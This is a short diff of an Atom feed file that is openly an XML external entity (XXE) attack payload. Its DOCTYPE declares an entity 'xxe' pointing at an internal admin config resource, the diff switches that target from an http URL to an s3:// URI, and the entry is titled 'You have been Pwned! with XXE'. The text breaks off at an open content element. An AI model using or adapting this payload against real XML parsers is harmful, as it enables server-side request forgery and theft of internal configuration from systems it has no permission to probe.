@@ -1,10 +1,10 @@
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE feed [
-  <!ENTITY xxe SYSTEM "http://internal-admin-access/config.aspx">
+  <!ENTITY xxe SYSTEM "s3://internal-admin.access/config.aspx">
 ]>
 <feed xmlns="http://www.w3.org/2005/Atom">
   <title>Welcome to AdverXaries // Hope you find what you're looking for!!!</title>
-  <link href="http://adverxarial.executable" rel="alternate"/>
+  <link href="http://byt3.pw" rel="alternate"/>
   <entry>
     <title>You have been Pwned! with XXE</title>
     <content type="html">
